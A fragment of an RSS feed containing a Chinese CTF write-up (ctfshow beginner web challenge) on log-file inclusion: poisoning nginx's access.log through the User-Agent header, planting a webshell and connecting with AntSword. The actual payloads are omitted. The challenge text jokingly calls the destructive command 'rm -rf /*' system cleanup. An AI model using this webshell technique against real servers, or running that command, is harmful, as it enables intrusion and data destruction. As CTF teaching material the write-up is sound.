+&lt;p&gt;题目描述： 阿呆终于怀揣自己的梦想来到了故土，凭借着高超的系统垃圾清理(rm -rf /*)技术，很快的阿呆找到了一份程序员工作 。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612593998895.png&#34;
+	width=&#34;943&#34;
+	height=&#34;624&#34;
+	srcset=&#34;https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612593998895_hu0dd163e524e8f82f63efb50ca2bdc02f_39226_480x0_resize_box_2.png 480w, https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612593998895_hu0dd163e524e8f82f63efb50ca2bdc02f_39226_1024x0_resize_box_2.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;1612593998895&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;151&#34;
+		data-flex-basis=&#34;362px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这道题考察文件包含，但是过滤了php，我们就不能直接包含带php的文件，也不能使用php://伪协议。&lt;/p&gt;
+&lt;p&gt;这道题的考察点是日志文件包含，说来奇怪我的wappalyzer没有检测到任何信息，但是根据以往的经验判断是nginx，所以日志默认位置是/var/log/nginx/access.log，可以直接访问，那我们就可以直接修改UA头&lt;img src=&#34;https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612594269404.png&#34;
+	width=&#34;1880&#34;
+	height=&#34;850&#34;
+	srcset=&#34;https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612594269404_hu8b26b40006a06705ecb9ae6dfe919fed_267203_480x0_resize_box_2.png 480w, https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612594269404_hu8b26b40006a06705ecb9ae6dfe919fed_267203_1024x0_resize_box_2.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;1612594269404&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;221&#34;
+		data-flex-basis=&#34;530px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;我这里嫌麻烦就直接用火狐编辑并重新发包了，在右下角那里可以看到修改的UA头：&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;p&gt;发送后重新访问日志文件&lt;img src=&#34;https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612594403945.png&#34;
+	width=&#34;1804&#34;
+	height=&#34;112&#34;
+	srcset=&#34;https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612594403945_hu2a335833daed5851f181241ac70b2ba6_45819_480x0_resize_box_2.png 480w, https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/1612594403945_hu2a335833daed5851f181241ac70b2ba6_45819_1024x0_resize_box_2.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;1612594403945&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1610&#34;
+		data-flex-basis=&#34;3865px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;可以看到/var/www/html下有36d.php这个文件，直接访问一片空白，查看源码也什么都没有。尝试getshell，修改UA头， &lt;!-- raw HTML omitted --&gt; 然后尝试使用菜刀类工具连接，我这里使用的是蚁剑，连上后自然就能找到flag了。&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
